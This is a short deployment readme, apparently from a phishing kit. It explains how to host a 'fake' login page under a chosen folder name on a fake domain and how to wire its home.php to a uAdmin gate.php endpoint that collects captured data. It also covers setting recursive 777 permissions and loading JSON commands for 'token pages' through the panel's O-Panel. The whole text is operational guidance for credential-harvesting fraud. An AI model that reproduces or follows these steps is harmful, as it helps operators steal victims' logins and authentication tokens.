-After unzip 'zip' you will see 'parent folder'. Name for this folder can be changed to anything you like but it can not be removed and 'fake' MUST stay inside 'patent folder'.  After all in url you can only have unique folders name.
   good!:
      domen.com/parentfolder/..../login 
      domen.com/anyname/..../login 
      domen.com/sgi/..../login

   not good!:
      domen.com/name/name/..../login
      domen.com/domen/..../login
      domen.com/com/..../login
      domen.com/dome/..../login


-To connect 'fake' to 'uadmin' you have to edit 'home.php' file ,
        OR download new 'home.php' file from already live uAdmin (no edit needed). 
 If you choose to edit existing 'home.php' then open 'home.php' and find line with "http(s)://{domain|ip}/uadmin/gate.php" and change {domain|ip} to your domain name or ip, where uAdmin located.



-Set '777' for 'parent folder' -R



-To access page over browser you have to open 'parent folder' 
    https://fakedomain.com/*/{parent_folder_name}/       where {parent_folder_name} is name of your 'parent folder' 

-If page is 'token page' than after connect to 'uadmin' 
       -go to token page on uadmin
       -find connected page with green dot
       -press O-Panel on its row
       -press Operations settings
       -press Advanced 
       -empty pop up text box 
       -insert json-formated commands in the bottom of this text file
       -press "save" on pop up box
       -press "save" on current page 
       -go back to o-panel
  after this you will be able to see commands set for current page
